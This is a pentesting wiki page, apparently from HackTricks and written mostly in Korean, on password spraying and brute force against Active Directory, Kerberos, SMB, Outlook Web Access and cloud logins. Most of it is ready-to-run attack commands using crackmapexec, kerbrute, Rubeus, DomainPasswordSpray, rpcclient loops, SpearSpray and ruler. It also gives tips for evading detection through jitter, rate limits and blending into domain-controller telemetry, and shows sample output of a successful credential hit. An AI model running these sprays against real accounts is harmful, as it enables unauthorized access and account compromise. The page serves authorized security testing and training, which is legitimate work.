# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

몇 개의 **valid usernames**를 찾으면, 발견한 각 사용자에 대해 가장 일반적인 **common passwords**를 시도해볼 수 있습니다(환경의 **password policy**를 고려하세요).\
기본적으로 **minimum password length**은 **7**입니다.

common usernames 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

여러 번 wrong passwords를 시도하면 일부 **accounts**가 **lockout**될 수 있다는 점에 주의하세요 (by default 10회 초과).

### Get password policy

만약 일부 user credentials나 domain user로서의 shell이 있다면, **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux(또는 모두)에서의 Exploitation

- **crackmapexec** 사용:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) 사용 (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(계정 잠금을 피하기 위해 시도 횟수를 지정할 수 있습니다):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) 사용 (python) - 권장하지 않음. 가끔 작동하지 않음
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**의 `scanner/smb/smb_login` 모듈 사용:

![](<../../images/image (745).png>)

- **rpcclient** 사용:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows에서

- brute module이 포함된 [Rubeus](https://github.com/Zer1t0/Rubeus) 버전 사용:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)을 사용하면 (기본적으로 domain에서 사용자를 생성할 수 있으며, domain에서 password policy를 가져와 그에 따라 시도 횟수를 제한합니다):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- 다음 도구: [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying은 SMB/NTLM/LDAP 바인드 시도보다 노이즈를 줄이고 AD 잠금 정책과 더 잘 맞습니다. SpearSpray는 LDAP 기반 타게팅, 패턴 엔진, 그리고 정책 인식(도메인 정책 + PSOs + badPwdCount 버퍼)을 결합해 정확하고 안전하게 스프레이합니다. 또한 Neo4j에 손상된 principals를 태그해 BloodHound 경로 분석에 사용할 수 있습니다.

Key ideas:
- LDAP 사용자 검색(페이징 및 LDAPS 지원), 선택적으로 커스텀 LDAP 필터 사용 가능.
- 도메인 잠금 정책 + PSO 인지 필터링으로 구성 가능한 시도 버퍼(임계값)를 남겨 사용자 잠금 방지.
- 빠른 gssapi 바인딩을 사용한 Kerberos pre-auth 검증(DC에서 4625 대신 4768/4771 생성).
- 이름 등 변수와 각 사용자의 pwdLastSet에서 도출한 시간 값을 사용하는 패턴 기반 사용자별 비밀번호 생성.
- 스레드, 지터, 초당 최대 요청수로 처리량 제어.
- 선택적 Neo4j 통합으로 소유한 사용자를 표시하여 BloodHound에 활용.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
대상 선정 및 패턴 제어:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth 및 안전 통제:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 데이터 보강:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
패턴 시스템 개요 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
사용 가능한 변수:
- {name}, {samaccountname}
- 각 사용자의 pwdLastSet(또는 whenCreated)에서 파생되는 시간 관련 변수: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- 구성 헬퍼 및 조직 토큰: {separator}, {suffix}, {extra}

운영 주의사항:
- 가급적 -dc로 PDC-emulator를 쿼리하여 가장 권위 있는 badPwdCount 및 정책 관련 정보를 읽어오세요.
- badPwdCount 리셋은 관찰 창(observation window) 이후 다음 시도에서 트리거됩니다; 안전을 위해 임계값(threshold)과 타이밍을 사용하세요.
- Kerberos pre-auth 시도는 DC telemetry에서 4768/4771로 나타납니다; 섞여들기 위해 jitter와 rate-limiting을 사용하세요.

> 팁: SpearSpray의 기본 LDAP 페이지 크기는 200입니다; 필요에 따라 -lps로 조정하세요.

## Outlook Web Access

p**assword spraying outlook**을 위한 여러 도구가 있습니다.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

이 도구들을 사용하려면 사용자 목록과 스프레이할 단일 password / 소량의 passwords 목록이 필요합니다.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 참고자료

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
